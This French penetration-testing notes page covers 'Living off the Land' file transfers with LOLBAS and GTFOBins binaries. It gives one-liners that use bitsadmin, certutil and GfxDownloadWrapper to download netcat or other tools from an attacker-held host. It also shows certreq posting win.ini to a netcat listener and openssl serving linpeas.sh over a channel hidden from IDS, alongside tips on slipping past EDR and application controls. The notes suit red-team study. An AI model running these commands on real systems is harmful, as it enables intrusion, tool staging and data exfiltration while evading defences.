# Living off the Land

## Pourquoi

Deposer un outil sur une cible, c'est laisser une trace. Les EDR detectent les binaires inconnus, les politiques applicatives bloquent les executables non signes, et chaque fichier ecrit sur disque augmente le risque de detection. L'approche "Living off the Land" consiste a utiliser les outils deja presents sur le systeme pour realiser des operations offensives, y compris les transferts de fichiers.

Le terme **LOLBins** (Living off the Land Binaries) designe ces executables systeme detournes de leur usage initial. Deux projets de reference les repertorient :

- [LOLBAS](https://lolbas-project.github.io/) pour Windows
- [GTFOBins](https://gtfobins.github.io/) pour Linux/Unix

## Comment ca marche

Ces binaires sont des outils legitimes du systeme (gestion de certificats, transferts en arriere-plan, outils de compilation). Ils possedent des fonctionnalites secondaires qui permettent de telecharger, televerser, lire ou ecrire des fichiers. Comme ils sont signes par l'editeur du systeme, ils passent generalement a travers les politiques de controle applicatif (AppLocker, WDAC).

Les deux sites de reference proposent des filtres par capacite (`/download`, `/upload`, `/execute`) pour trouver rapidement le binaire adapte a la situation.

## En pratique

### LOLBAS (Windows)

**Bitsadmin** : gestionnaire de telechargement en arriere-plan natif Windows.

```powershell
bitsadmin /transfer job /priority foreground http://<IP_CIBLE>:8080/nc.exe C:\Users\Public\nc.exe
```

**PowerShell BITS** :

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<IP_CIBLE>:8080/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Certutil** : outil de gestion de certificats, souvent utilise comme alternative a wget.

```cmd
certutil.exe -verifyctl -split -f http://<IP_CIBLE>:8080/nc.exe
```

{% hint style="warning" %}
Certutil est fortement surveille par les EDR et l'AMSI. Son utilisation pour telecharger des fichiers declenche des alertes dans la plupart des environnements securises.
{% endhint %}

**CertReq.exe** : permet d'envoyer un fichier via une requete HTTP POST.

Sur l'attaquant :

```bash
sudo nc -lvnp 8000
```

Sur la cible :

```cmd
certreq.exe -Post -config http://<IP_CIBLE>:8000/ C:\Windows\win.ini
```

**GfxDownloadWrapper.exe** : installe avec certains pilotes Intel Graphics, il contient une fonctionnalite de telechargement souvent ignoree par les politiques de securite.

```powershell
GfxDownloadWrapper.exe "http://<IP_CIBLE>/outil.exe" "C:\Temp\outil.exe"
```

### GTFOBins (Linux)

**OpenSSL** : permet de creer un canal de transfert chiffre, similaire a Netcat mais avec SSL.

Cote attaquant :

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/linpeas.sh
```

Cote cible :

```bash
openssl s_client -connect <IP_CIBLE>:80 -quiet > linpeas.sh
```

{% hint style="info" %}
L'avantage d'OpenSSL par rapport a Netcat est le chiffrement natif du canal. Le transfert ne sera pas visible en clair par un IDS.
{% endhint %}

## Pieges et galeres

- Les binaires LOL les plus connus (certutil, mshta, rundll32) sont desormais surveilles par la majorite des EDR. Leur utilisation pour du transfert de fichiers est souvent detectee.
- Les versions de Windows ne disposent pas toutes des memes binaires. `CertReq.exe -Post` n'est pas disponible sur toutes les editions.
- Sur Linux, les binaires GTFOBins dependent des paquets installes. Un conteneur Docker minimal n'aura pas grand chose de disponible.
- L'approche LOL ne dispense pas de la prudence : meme sans deposer de fichier, les lignes de commande sont enregistrees dans les logs (PowerShell ScriptBlock Logging, Sysmon).

## Retour terrain

Explorer les projets LOLBAS et GTFOBins avant un engagement, et preparer quelques one-liners pour les binaires les plus courants, fait gagner un temps precieux. En situation reelle, quand les outils classiques sont bloques, un binaire systeme inattendu peut debloquer la situation. L'ideal est de maintenir un repertoire personnel de commandes testees et validees.

## Memo express

| Binaire | OS | Usage |
|---|---|---|
| `bitsadmin` | Windows | Telechargement HTTP en arriere-plan |
| `certutil` | Windows | Telechargement HTTP (surveille) |
| `certreq` | Windows | Upload via POST |
| BITS (PowerShell) | Windows | Telechargement via `Start-BitsTransfer` |
| `openssl` | Linux | Transfert chiffre (serveur/client SSL) |

***
